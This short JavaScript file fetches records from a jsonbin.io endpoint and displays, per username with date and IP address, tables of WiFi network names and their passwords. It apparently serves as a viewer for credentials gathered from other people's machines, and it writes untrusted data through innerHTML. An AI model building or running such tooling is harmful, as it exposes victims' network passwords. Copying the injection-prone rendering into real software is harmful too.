function wifiLists(username, date, data, ip) {
    var temp = document.getElementsByTagName("template")[0];
    var clon = temp.content.cloneNode(true);
    data.forEach(wifi =>{
        clon.querySelector('.t tbody').innerHTML += `<tr><td>${wifi.ssid}</td><td>${wifi.password}</td></tr>`
    });
    clon.querySelector('.title').innerHTML += `${username}<br>${date}<br>${ip}`
    document.body.appendChild(clon);
}

data = []
$.ajax({
    method:'GET',
    url:'https://api.jsonbin.io/b/60970ca47a19ef1245a5c443/latest',
    success:function (response) {
        data = response;
        added = []
        data.forEach(wifi => {
            if (!added.includes(wifi.username)) {
                added += wifi.username
                wifiLists(wifi.username,wifi.date,wifi.data,wifi.ip)
            }
        });
    }
});
